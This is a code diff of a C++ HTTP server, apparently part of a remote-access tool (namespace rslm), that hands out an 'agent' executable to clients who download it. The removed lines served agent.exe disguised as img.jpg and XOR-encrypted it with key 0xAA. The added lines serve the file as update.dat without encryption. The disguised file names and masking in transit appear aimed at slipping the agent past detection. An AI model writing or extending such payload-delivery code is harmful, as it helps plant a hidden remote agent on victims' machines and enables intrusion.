@@ -17,18 +17,6 @@ namespace rslm {
     namespace server {
         namespace networking {
 
-            // Clé XOR pour chiffrer l'agent (à la volée)
-            const unsigned char XOR_KEY = 0xAA;
-
-            // Fonction pour chiffrer/déchiffrer les données avec XOR
-            std::vector<char> XorEncrypt(const std::vector<char>& input) {
-                std::vector<char> output = input;
-                for (size_t i = 0; i < output.size(); i++) {
-                    output[i] ^= XOR_KEY;
-                }
-                return output;
-            }
-
             // Fonction utilitaire pour nettoyer les caractères non UTF-8
             std::string sanitize(const std::string& input) {
                 std::string output;
@@ -47,17 +35,14 @@ namespace rslm {
             }
 
             // ============================================================
-            // SERVEUR HTTP POUR PARTAGER L'AGENT (VERSION CHIFFRÉE)
+            // SERVEUR HTTP POUR PARTAGER L'AGENT (SANS CHIFFREMENT)
             // ============================================================
 
             static void HandleHttpRequest(SOCKET clientSocket, const std::string& request) {
-                // Cherche si la requête demande update.dat (le nom changé)
-                if (request.find("GET /img.jpg") != std::string::npos) {
-                    // Lire le fichier agent.exe
-                    std::ifstream file("img.jpg", std::ios::binary | std::ios::ate);
-                    if (!file.is_open()) {
-                        file.open("agent.exe", std::ios::binary | std::ios::ate);
-                    }
+                // Cherche si la requête demande update.dat
+                if (request.find("GET /update.dat") != std::string::npos) {
+                    // Lire le fichier update.dat
+                    std::ifstream file("update.dat", std::ios::binary | std::ios::ate);
 
                     if (file.is_open()) {
                         std::streamsize size = file.tellg();
@@ -65,19 +50,16 @@ namespace rslm {
 
                         std::vector<char> buffer(size);
                         if (file.read(buffer.data(), size)) {
-                            // CHIFFRER LE FICHIER AVANT ENVOI
-                            std::vector<char> encrypted = XorEncrypt(buffer);
-
-                            // Envoyer la réponse HTTP
+                            // Envoyer la réponse HTTP (sans chiffrement)
                             std::string response = "HTTP/1.1 200 OK\r\n";
                             response += "Content-Type: application/octet-stream\r\n";
-                            response += "Content-Length: " + std::to_string(encrypted.size()) + "\r\n";
+                            response += "Content-Length: " + std::to_string(size) + "\r\n";
                             response += "Connection: close\r\n\r\n";
 
                             send(clientSocket, response.c_str(), (int)response.size(), 0);
-                            send(clientSocket, encrypted.data(), (int)encrypted.size(), 0);
+                            send(clientSocket, buffer.data(), (int)size, 0);
 
-                            std::cout << "[HTTP] Agent chiffré envoyé (" << encrypted.size() << " bytes, XOR key=" << (int)XOR_KEY << ")" << std::endl;
+                            std::cout << "[HTTP] update.dat envoyé (" << size << " bytes)" << std::endl;
                             return;
                         }
                     }
@@ -127,7 +109,6 @@ namespace rslm {
                 listen(sock, 5);
                 std::cout << "[HTTP] Serveur HTTP démarré sur le port " << port << std::endl;
                 std::cout << "[HTTP] Télécharge update.dat sur http://IP:" << port << "/update.dat" << std::endl;
-                std::cout << "[HTTP] Le fichier est chiffré avec XOR 0xAA" << std::endl;
 
                 while (true) {
                     sockaddr_in clientAddr;
